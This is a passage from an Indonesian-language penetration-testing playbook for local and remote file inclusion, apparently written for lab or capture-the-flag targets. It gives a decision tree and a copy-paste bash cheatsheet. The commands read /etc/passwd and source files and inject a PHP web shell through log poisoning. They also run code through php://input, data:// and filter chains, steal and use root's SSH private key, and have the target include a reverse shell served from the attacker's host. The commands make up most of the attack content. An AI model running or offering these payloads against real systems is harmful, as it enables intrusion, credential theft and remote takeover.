> - `CVE [year] [web server] path traversal`

---

## ═══════════════════════════════════════
## MASTER DECISION TREE (RINGKASAN)
## ═══════════════════════════════════════

```
START: Parameter file/page/path/include ditemukan
│
├─ FASE 0: Fingerprint
│   ├─ Linux → target: /etc/passwd, /proc, logs
│   └─ Windows → target: win.ini, hosts, web.config
│
├─ FASE 1: Parameter Discovery
│   ├─ [Parameter obvious] → FASE 2
│   └─ [Tidak ada] → ffuf parameter fuzzing
│
├─ FASE 2: Konfirmasi LFI
│   ├─ [/etc/passwd terbaca] → FASE 3
│   ├─ [Gagal, ada filter] → Bypass (encode/....// /absolute path)
│   └─ [Semua gagal] → Bukan LFI, cek vulnerability lain
│
├─ FASE 3: Sensitive File Collection
│   ├─ [SSH key ditemukan] → chmod 600 → SSH login
│   ├─ [Creds di .env/config] → Test ke SSH/DB/FTP
│   └─ [Log bisa dibaca] → FASE 5 (Log Poisoning)
│
├─ FASE 4: PHP Source Disclosure
│   ├─ [php://filter berhasil] → Baca config/upload path/logic
│   ├─ [Upload path ketahuan] → PATH C (Upload + LFI)
│   └─ [Tidak ada jalan lain] → Filter Chain Generator
│
├─ FASE 5: Log Poisoning
│   ├─ [Apache/Nginx log readable] → Inject UA → Include log → RCE
│   ├─ [auth.log readable] → SSH username inject → Include → RCE
│   └─ [Log tidak bisa dibaca] → FASE 6 (Wrapper RCE)
│
├─ FASE 6: RCE Paths
│   ├─ PATH A: php://input → POST PHP code → RCE
│   ├─ PATH B: data:// → base64 PHP → RCE
│   ├─ PATH C: Upload + LFI → include uploaded PHP
│   ├─ PATH D: Session poisoning → include sess_ file
│   └─ Filter Chain → tanpa upload/log/external server → RCE
│
├─ FASE 6B: RFI (jika allow_url_include=On)
│   ├─ [Request masuk ke server kita] → Serve revshell.php → RCE
│   └─ [Tidak ada request] → allow_url_include=Off, kembali ke LFI path
│
└─ FASE 7: Post-Exploitation
    ├─ [Shell www-data] → sudo -l → SUID → privesc
    ├─ [Creds dari config] → Reuse ke SSH/DB/FTP
    └─ [Double network] → Pivoting ke <a href="/docs/pivoting-tunneling" class="text-[#00b4d8] hover:underline font-mono font-semibold">64_pivoting_tunneling_workflow.md</a>
```

---

## ⚡ CHEATSHEET — COPY PASTE READY

```bash
# === SETUP ===
export TARGET="10.10.11.100"; export LHOST="10.10.14.5"; export LPORT="4444"
mkdir -p ~/lfi_loot/{source,creds,logs,payloads,keys}
alias lfi='curl -sG "http://$TARGET/index.php" --data-urlencode'

# === KONFIRMASI LFI ===
lfi "page=../../../../etc/passwd"                          # Linux basic
lfi "page=../../../../windows/win.ini"                     # Windows basic
lfi "page=/etc/passwd"                                     # Absolute path
lfi "page=....//....//....//etc/passwd"                    # Filter bypass

# === SOURCE CODE DISCLOSURE ===
lfi "page=php://filter/convert.base64-encode/resource=index.php" | base64 -d
lfi "page=php://filter/convert.base64-encode/resource=config.php" | base64 -d
lfi "page=php://filter/convert.base64-encode/resource=.env" | base64 -d

# === LOG POISONING ===
curl -s -A '<?php system($_GET["cmd"]); ?>' "http://$TARGET/"   # Inject
lfi "page=../../../../var/log/apache2/access.log" --data-urlencode "cmd=id"  # Exec

# === WRAPPER RCE ===
# php://input
curl -s -X POST "http://$TARGET/index.php?page=php://input" --data '<?php system("id"); ?>'
# data://
lfi "page=data://text/plain;base64,$(printf '<?php system("id"); ?>' | base64 -w 0)"

# === FILTER CHAIN RCE ===
git clone https://github.com/synacktiv/php_filter_chain_generator ~/tools/fcg
python3 ~/tools/fcg/php_filter_chain_generator.py --chain '<?php system("id"); ?>' | tail -1 > /tmp/chain.txt
lfi "page=$(cat /tmp/chain.txt)"

# === SSH KEY ===
lfi "page=../../../../root/.ssh/id_rsa" > /tmp/root_rsa.txt
grep -A 9999 "BEGIN" /tmp/root_rsa.txt | grep -B 9999 "END" > /tmp/id_rsa
chmod 600 /tmp/id_rsa && ssh -i /tmp/id_rsa root@$TARGET

# === RFI ===
python3 -m http.server 8080 &
lfi "page=http://$LHOST:8080/revshell.php"
```

---

> **➡️ NEXT:** Setelah LFI/RFI selesai dan dapat shell, lanjut ke **[25 — File Upload Workflow](/docs/file-upload)** untuk teknik upload bypass yang lebih advanced, atau jika ditemukan upload endpoint dari source disclosure di Fase 4.

→ [File 25: File Upload](/docs/file-upload)